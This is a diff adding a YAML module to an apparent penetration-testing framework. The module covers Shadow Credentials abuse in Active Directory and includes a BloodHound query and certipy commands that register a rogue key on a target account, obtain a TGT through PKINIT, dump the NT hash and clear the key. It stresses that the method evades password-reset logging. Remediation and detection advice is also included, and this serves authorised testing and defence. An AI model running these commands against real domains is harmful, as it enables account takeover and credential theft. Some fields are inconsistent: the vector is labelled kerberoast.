@@ -1,0 +1,64 @@
+# AddSelf / Shadow Credentials — msDS-KeyCredentialLink write
+#
+# The msDS-KeyCredentialLink attribute on a user/computer object
+# holds registered "shadow" public keys used for Windows Hello for
+# Business / passwordless auth. An operator with GenericAll,
+# GenericWrite, WriteProperty, or the AddSelf ExtendedRight on a
+# target can register their own key pair via that attribute, then
+# PKINIT to obtain a TGT for the target — no password reset needed
+# (quieter than the GenericAll route, no event 4724).
+#
+# ShadowCredentials is Charlie Bromberg's canonical name; the
+# tooling is certipy `shadow` or Whisker.
+technique: T1098
+name: BloodHound edge — msDS-KeyCredentialLink → PKINIT as target
+tactic: [credential-access, persistence, lateral-movement]
+platform: [windows]
+key: adroute:shadow-credentials
+ranking:
+  exploitability: high             # deterministic when the edge exists
+  safety: config-change            # writes msDS-KeyCredentialLink
+  detection: quiet                  # msDS-KeyCredentialLink is under-monitored
+detect:
+  group_member: Domain Users
+execute:
+  command: |-
+    where certipy-ad.exe 2>nul & where Whisker.exe 2>nul & echo "Shadow Credentials route surfaced — see playbook"
+verify:
+  success: "Credentials"
+cleanup:
+  command: ""
+report:
+  vector_type: kerberoast
+  evidence: "on a domain (Domain Users); Shadow Credentials route worth checking"
+  description: >
+    An operator with write access to a target's
+    msDS-KeyCredentialLink attribute (via GenericAll / GenericWrite
+    / WriteProperty / AddSelf on the target) registers their own
+    key pair on the account and then PKINITs to obtain a TGT.
+    No password reset (event 4724 not raised), no NT hash change
+    — quieter than the GenericAll route and equally effective
+    on machine accounts (where forcing a password reset breaks
+    the host).
+  remediation: >
+    Enable Extended Protection for Authentication + audit
+    msDS-KeyCredentialLink writes (event 5136 with
+    LDAPDisplayName = msDS-KeyCredentialLink). Restrict write on
+    that attribute to explicit trust anchors (Windows Hello
+    provisioning servers, MDM registrars). certipy `shadow list`
+    against every user with `-username DA` on a scheduled basis
+    is a hunt job worth having.
+  refs: [T1098, msDS-KeyCredentialLink, shadow-credentials]
+playbook:
+  summary: >
+    Domain foothold — check BloodHound for write access to a
+    target's msDS-KeyCredentialLink. Register a shadow key,
+    PKINIT for a TGT, and you own the target account without
+    touching its password.
+  place: 'attacker-side (certipy-ad shadow)'
+  steps:
+    - "in BloodHound: MATCH p=(u:User {owned:true})-[r:GenericAll|GenericWrite|WriteProperty|AddSelf]->(t) WHERE 'KeyCredentialLink' IN r.name OR type(r) IN ['GenericAll','GenericWrite'] RETURN p"
+    - "for target T, add a shadow key: `certipy-ad shadow auto -account '<T>' -u '<owned-user>@CORP.LOCAL' -p '<pass>' -dc-ip <dc>`"
+    - "certipy auto-does the PKINIT and dumps the NT hash — copy it into the fieldkit cred store: `fieldkit add cred 'CORP/<T>::<nt-hash>'`"
+    - "certipy also auto-removes the shadow key when the -action auto mode completes; verify with `certipy-ad shadow list -account '<T>' ...`"
+  restore: "certipy-ad shadow clear -account '<T>' -u '<owned-user>@CORP.LOCAL' -p '<pass>' -dc-ip <dc>"
